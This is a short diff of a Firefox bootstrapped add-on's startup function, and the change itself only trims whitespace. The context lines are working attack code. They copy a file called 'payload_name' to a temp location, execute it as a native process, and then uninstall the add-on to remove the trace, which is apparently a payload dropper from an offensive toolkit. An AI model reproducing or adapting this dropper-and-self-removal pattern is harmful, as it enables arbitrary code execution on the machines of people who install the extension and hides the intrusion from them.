@@ -13,11 +13,11 @@ function startup(data, reason) {
   tmp.append(payload_name);
   tmp.createUnique(Components.interfaces.nsIFile.NORMAL_FILE_TYPE, 0666);
   file.copyTo(tmp.parent, tmp.leafName);
-    
+
   var process=Components.classes["@mozilla.org/process/util;1"].createInstance(Components.interfaces.nsIProcess);
   process.init(tmp);
   process.run(false,[],0);
-      
+
   try { // Fx < 4.0
     Components.classes["@mozilla.org/extensions/manager;1"].getService(Components.interfaces.nsIExtensionManager).uninstallItem(xpi_guid);
   } catch (e) {}
